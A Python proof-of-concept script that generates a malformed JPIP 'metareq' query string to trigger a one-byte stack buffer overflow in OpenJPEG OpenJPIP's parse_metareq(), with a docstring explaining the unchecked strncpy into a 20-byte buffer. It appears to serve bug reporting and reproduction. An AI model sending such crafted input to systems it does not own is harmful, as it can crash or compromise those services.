#!/usr/bin/env python3
"""
PoC generator for: stack-buffer-overflow in OpenJPEG OpenJPIP
parse_metareq() (src/lib/openjpip/query_parser.c)

The JPIP "metareq" query field value is parsed as
"[req-box-prop;req-box-prop;...]R<n>D<n>", where each ';'/']'-delimited
req-box-prop segment is strncpy()'d into a fixed
`char req_box_prop[20]` stack buffer without any length check against
that segment's actual length. A single segment longer than 19 chars
overflows it.

Output: query_string.txt - QUERY_STRING value with a single 21-char
req-box-prop segment (one byte past the 20-byte buffer, i.e. minimal
overflow), staying well under the caller's fieldval[128] budget so this
PoC isolates parse_metareq()'s bug from get_fieldparam()'s separate bug.
"""

SEGMENT_LEN = 21   # > sizeof(req_box_prop)=20
segment = "b" * SEGMENT_LEN
QUERY_STRING = f"metareq=[{segment}]"

if __name__ == "__main__":
    with open("query_string.txt", "w") as f:
        f.write(QUERY_STRING)
    print(f"wrote query_string.txt: {QUERY_STRING!r} ({len(QUERY_STRING)} bytes)")
